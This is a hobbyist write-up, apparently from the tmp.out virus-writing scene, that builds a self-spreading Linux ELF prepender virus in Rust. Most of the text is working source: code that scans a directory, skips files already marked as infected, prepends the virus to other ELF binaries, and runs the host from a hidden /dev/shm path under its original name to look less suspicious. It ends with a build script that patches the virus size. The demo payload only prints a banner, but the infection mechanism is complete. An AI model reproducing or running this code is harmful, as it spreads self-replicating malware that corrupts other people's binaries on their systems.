# Linux.FerrisFirst

I was reading a blog post by TMZ about a simple ELF prepender called [Linux.Fe2O3](https://www.guitmz.com/linux-fe2o3-rust-virus/) written in Rust. I read the code and suddenly a lot of things seemed to click in my head, so I wanted to have a go at reimplementing it myself. 

When running an infected program, Linux.FerrisFirst will first print a cool `tmp.out` header, then extract the host binary to a path that is unique to the infected file, so that multiple infected files may run without interfering with each other. Additionally, the extracted host file will have the same name as the original, which makes it less obvious in some command outputs:

```
$ ./nc -lp 4444
.: tmp.out :.

```
```
$ ss -tulpn
Netid   State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port   Process
tcp     LISTEN  0       1       0.0.0.0:4444        0.0.0.0:*           users:(("nc",pid=19036,fd=3))
```

but not all...
```
$ ps aux | grep nc
vagrant    19035  0.0  0.2   3692  2580 pts/1    S+   18:28   0:00 ./nc -lp 4444
vagrant    19036  0.0  0.0   3252   844 pts/1    S+   18:28   0:00 /dev/shm/.ferris_first/work/simple-elf-prepender/nc -lp 4444
```

Disclaimer: The code paired with this document are provided for free, with no warranty whatsoever, in the spirit of free information. I am not responsible for how you use this information or this code.

## Overview

This is my first prepender, and also my first time implementing a spreading mechanism. The process of infection is actually quite simple, and boils down to three steps:

1. Take a backup of the original host binary
2. Copy the entire binary code over the host
3. Append the original binary to the virus

The result is one file that contains both the virus and the original ELF files.

```
   0 | Virus ELF
 ... | ...
 ??? | Original ELF
 ... | ...
```

The virus as a whole needs to perform the following 3 tasks:

1. Look for files to spread to and perform the above 4 infection steps
2. Run its own `main` (do something a virus would do)
3. Execute the original ELF file

That's the theory - now to practice!

As explained above, the virus will have 3 primary functions:

```rust
/// Finds and infects other ELF files
fn spread_and_infect() {}

/// Code that is executed when an infected file is ran
fn virus_main() {}

/// Extracts and execute the host code
fn execute_host() {}
```

Note that these tasks are independent of each other: even if `spread_and_infect` fails, `virus_main` should execute, and if that fails, `execute_host` should execute. Additionally, as a virus, we don't need to have verbose error handling; silent errors are okay!

## Spreading to other ELFs

The `spread_and_infect` function needs to know 2 things:
- where to look for potential hosts
- the virus code to inject if it does find a host

We can pass this information as arguments:

```rust
use std::{env, fs};

/// Finds and infects other ELF files
fn spread_and_infect(dir: &str, virus: &[u8]) {}

fn main() {
    let my_name = &env::args().collect::<Vec<String>>()[0];
    if let Ok(my_code) = fs::read(my_name) {
        // Spread and infect neighboring ELFs
        spread_and_infect(".", &virus);  
    }
}
```

The code of `spread_and_infect` should search for ELF files in the given directory, check if they are a suitable host, and infect them. The function should `return` silently if `fs::read_dir` fails.

```rust
/// Finds and infects other ELF files
fn spread_and_infect(dir: &str, virus: &[u8]) {    
    let entries = match fs::read_dir(dir) {
        Ok(v) => v.filter_map(Result::Ok).collect(), // Ignore Result<DirEntries> that are `Err`
        Err(_) => return,
    };

    for entry in entries {
        let mut contents = match fs::read(entry.path()) {
            Ok(v) => v,
            Err(_) => continue, // Skip if unable to read (bad permissions etc)
        };

        // ...
    }
}
```

Now, we must decide how to find suitible hosts. The goal is to infect files that have an ELF signature, but do not have an infection mark. The infection mark is present in the virus binary (but not in the source code!) and so the virus will not reinfect itself.

```rust
const ELF_MAGIC: &[u8; 4] = &[0x7f, 0x45, 0x4c, 0x46];
const INFECTION_MARK: &[u8; 8] = b"tmp.out\xff";

/// Checks whether `bytes` starts with an ELF signature
fn is_elf(bytes: &[u8]) -> bool {
    // ...
}

/// Checks whether `bytes` contains the infection mark
fn is_infected(bytes: &[u8]) -> bool {
    // ...
}

/// Finds and infects other ELF files
fn spread_and_infect(dir: &str, virus: &[u8]) {    
    // ...

    for entry in entries {
        // ...

        // Skip if this is not an ELF file
        if !is_elf(&contents) { continue; }

        // Skip if this file is already infected
        if is_infected(&contents) { continue; }

        // Infect this file
        let mut new_file = vec![];
        new_file.extend_from_slice(&virus);
        new_file.extend_from_slice(&contents);
        let _ = fs::write(entry.path(), &new_file); // Ignore `Err`s
    }
}
```

The first time the virus is run, it's okay to prepend the entire virus binary onto the host, but from that point forward, `virus` will include not just the virus code, but its host's code as well. In Rust, it is tricky to determine exactly what portion of the code should be copied. This sample relies on a `VIRUS_SIZE` constant that needs to be adjusted everytime the binary is recompiled (more on this later). `main` is updated to only pass the virus code to `spread_and_infect`.

```rust
const VIRUS_SIZE: usize = 0; // Placeholder value

fn main() {
    let my_name = &env::args().collect::<Vec<String>>()[0];
    if let Ok(my_code) = fs::read(my_name) {
        // Spread and infect neighboring ELFs
        spread_and_infect(".", &my_code[..VIRUS_SIZE]);
    }
}
```

With the `spread_and_infect` function completed, this virus can infect neighboring ELF files. An infected ELF file will then try to infect its own neighbors, and the spread continues. However, it will not yet execute the host binary; we will implement `execute_host` next.

## Executing the host binary

There are two scenarios here. The original virus binary does not have a host, so this function should be skipped in that case. Otherwise, there is a host which can be extracted and ran. Note that the same will apply to `virus_main`.

It's also important to consider the scenario where multiple infected binaries are run at the same time. For example, one infected program may be in a loop, when another infected program is run. For this reason, hosts should be extracted to unique paths - this sample makes use of the infected binary's name for this. 

`execute_host` is passed the following arguments:
- `name`: the name of the infected binary
- `contents`: the ELF contents of the host
- `args`: the CLI args to forward to the host minus the program name

```rust
/// Code that is executed when an infected file is ran
fn virus_main() {}

/// Extracts and execute the host code
fn execute_host(name: &String, contents: &[u8], args: &Vec<String>) {}

fn main() {
    let args: Vec<String> = env::args().collect();
    let my_name = &args[0];
    if let Ok(my_code) = fs::read(my_name) {
        // Spread and infect neighboring ELFs
        spread_and_infect(".", &my_code[..VIRUS_SIZE]);

        // Run the virus if there is a host attached
        if my_code.len() > VIRUS_SIZE {
            virus_main();
            execute_host(&my_name, &my_code[VIRUS_SIZE..], &args[1..]);
        }
    }
}
```

`execute_host` simply creates a new file, writes the host binary, sets permissions and executes. This way, the host's original behavior is replicated. The `BASE_PATH` below is set in `/dev/shm` to avoid actual writes to disk (instead the file will live in memory). Additionally, the file is cleaned up after execution. 

```rust
use std::process::Command;
use std::os::unix::fs::PermissionsExt;

const BASE_DIR: &str = "/dev/shm/.ferris_first/";

/// Extracts and execute the host code
fn execute_host(name: &String, contents: &[u8], args: &[String]) {
    // Will not fail since we know name is a valid path
    let canon = fs::canonicalize(name).unwrap();
    let mut path = PathBuf::from(BASE_DIR);
    path.push(canon.strip_prefix("/").unwrap());
    let dir = path.parent().unwrap();
    let perms = fs::Permissions::from_mode(0o700);
    
    // Create parent directory, file, and set permissions
    if let Err(_) = fs::create_dir_all(dir) { return; }
    if let Err(_) = fs::write(&path, &contents) { return; }    
    if let Err(_) = fs::set_permissions(&path, perms) { return; }

    let _ = Command::new(&path).args(args).status(); // Discard Result
    if let Err(_) = fs::remove_file(&path) { return; }
}
```

## The virus payload

The virus should work now, but it won't actually leave any traces to show that it ran. We can add code to `virus_main` to do just that. Remember in `main` we set `virus_main` to execute before `execute_host`! Here is a non-destructive payload that prints a cool header to stdout when an infected binary is ran.

```rust
/// Code that is executed when an infected file is ran
fn virus_main() {
    println!("\x1b[92m{}\x1b[0m", ".: tmp.out :.");
}
```

### Patching the `VIRUS_SIZE` constant

As mentioned previously, setting a valid `VIRUS_SIZE` is tricky in Rust. I opted to write a small shell script `build.sh` that performs the following:

1. Build the virus once and get the output file size
2. Patch the virus source code with the correct size
3. Rebuild the virus

```sh
#!/bin/sh

# The line in source code to match
DECL='const VIRUS_SIZE: usize = '

# Compiler options: no fancy panic, link time optimization, max optimization, no debug_info, strip
OPTS='+nightly -C panic=abort -C lto=y -C opt-level=z -C debuginfo=0 -Z strip=symbols'

# Compile virus once, compress with upx, and get final size
rustc $OPTS ferris-first.rs -o Linux.FerrisFirst || exit
SIZE=`wc Linux.FerrisFirst | awk '{print $3}'`

# Patch `VIRUS_SIZE` in the source code and recompile
sed -i -s "s/${DECL}.*;/${DECL}${SIZE};/g" ferris-first.rs
rustc $OPTS ferris-first.rs -o Linux.FerrisFirst
```

Building the virus twice is a little bit expensive but it's only required once and I think it's perfectly okay for a demo.

## Conclusion

I hope this document was helpful. I myself learned a lot while writing this. Huge thanks to TMZ, sblip, and others at tmp.out for teaching and motivating me to follow through with this project <3